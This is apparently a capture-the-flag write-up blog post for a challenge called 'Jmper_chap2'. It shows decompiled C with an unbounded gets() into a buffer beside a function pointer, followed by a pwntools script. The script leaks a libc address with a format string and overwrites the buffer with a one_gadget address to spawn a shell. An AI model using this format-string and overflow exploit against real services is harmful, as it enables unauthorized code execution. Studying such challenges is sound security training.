+++
title = "Jmper_chap2"
subtitle = "Jmper_chap2"

# Add a summary to display on homepage (optional).
summary = "Jmper_chap2"

date = "2019-11-02T18:32:15+09:00"
publishDate = "2019-11-02T18:32:15+09:00"
expiryDate = ""

# Authors. Comma separated list, e.g. `["Bob Smith", "David Jones"]`.
authors = []

# Tags and categories
# For example, use `tags = []` for no tags, or the form `tags = ["A Tag", "Another Tag"]` for one or more tags.
tags = []
categories = []
keywords = []

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["deep-learning"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
# projects = ["internal-project"]

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
[image]
  # Caption (optional)
  caption = ""

  # Focal point (optional)
  # Options: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight
  focal_point = ""

draft = false
+++

```c
void main(__int64 argc, char **argv, char **env)
{
  char **_argv; // [sp+0h] [bp-20h]@1
  int _menu; // [sp+14h] [bp-Ch]@2

  _argv = argv;
  qword_202060[29] = (void (__fastcall *)(_QWORD, _QWORD))off_202010;
  setvbuf(stdout, 0, 2, 0);
  puts("let's Chasing jumper. Paladin!");
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      _menu = getchar();
      getchar();
      fflush(stdin);
      if ( _menu != '1' )
        break;
      printf("Damn! we lost jumper trace.. you should find it yourself.");
    }
    if ( _menu == '2' )
      break;
    puts("wrong input!");
  }
  printf("open the portal. FIRST TRY : ");
  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&qword_202060[4]) )
    sub_95A((__int64)qword_202060);
  puts("\nYou Failed! I'll give you one more chance! ");
  printf("SECOND TRY : ");
  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&qword_202060[4]) )
    sub_95A((__int64)qword_202060);
  puts("You Failed Again! we lost signal..");
  exit(0);
}
```

메뉴는 다음과 같습니다.

```c
int menu()
{
  puts("what do you want? ");
  puts("1 : find jumper's traces.");
  puts("2 : open the portal ");
  return printf("> ");
}
```

```c
void __fastcall __noreturn sub_95A(__int64 s)
{
  fflush(stdin);
  gets(s);
  if ( strchr((const char *)s, 'n') )
  {
    puts("wait, what are you doing?");
    exit(0);
  }
  qword_202060[29](s, 'n');
  longjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )(s + 32), 1);
}
```

```c
.data:0000000000202010 off_202010      dq offset printf        ; DATA XREF: main+1Ao
```

```py
from pwn import *

def main():
    r = remote('172.17.0.2', 1300)
    #r = remote('1.224.175.17', 9982)
    libc = ELF('./libc.so.6')
    one_shot = 0x10a38c

    r.recvuntil('> ')
    r.sendline(str(2))

    raw_input()
    r.recvuntil(': ')
    r.sendline('%2$p')
    a0 = r.recvline()
    libc.address = int(a0, 16) - 413312
    log.info(hex(libc.address))
    # %2$p = libc + 413312

    r.recvuntil(': ')
    r.sendline('A' * 0xe8 + p64(libc.address + one_shot))
    #r.sendline('a' * (8 * 29) + 'b')

    r.interactive()

if __name__ == '__main__':
    main()
```
